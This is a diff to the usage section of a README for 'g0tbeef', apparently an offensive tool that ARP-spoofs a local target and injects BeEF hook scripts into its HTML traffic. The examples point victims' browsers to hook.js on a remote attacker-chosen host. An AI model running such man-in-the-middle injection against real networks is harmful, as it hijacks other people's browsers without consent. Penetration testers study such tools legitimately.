@@ -10,15 +10,19 @@ Run 'make install' in the g0tbeef directory. g0tbeef can now be run from anywher
 
 Usage:
 =======
-	g0tbeef - Inject Beef hooks into html responses
-		
-	Usage - g0tbeef <options>
-			-t <ip> 	~  ip extension to target
-			-r <ip> 	~  full ip of remote beef server
-			-p <port>	~  port of remote beef server
 
-	Examples
-			g0tbeef -t 2								
-			  ~  Attack xx.xx.xx.2
-			g0tbeef -r googlebeefhook.com -p 80	
-			  ~  Use beef hook at http://googlebeefhook.com:80/hook.js
+	g0tbeef - Inject Beef hooks into html responses via ARP spoofing
+
+	Usage:  g0tbeef <options>
+
+			-t <ip> 	~  ip extension to target
+			-r <ip> 	~  full ip address for beef server
+			-p <port>	~  port of beef server
+			-e          	~  external ip address for beef server
+
+	Examples:
+		g0tbeef -t 2								
+		  ~  Attack xx.xx.xx.2 beef hook: $MYI:3000/hook.js
+		  
+		g0tbeef -r googlebeefhook.com -p 80	
+		  ~  beef hook: http://googlebeefhook.com:80/hook.js
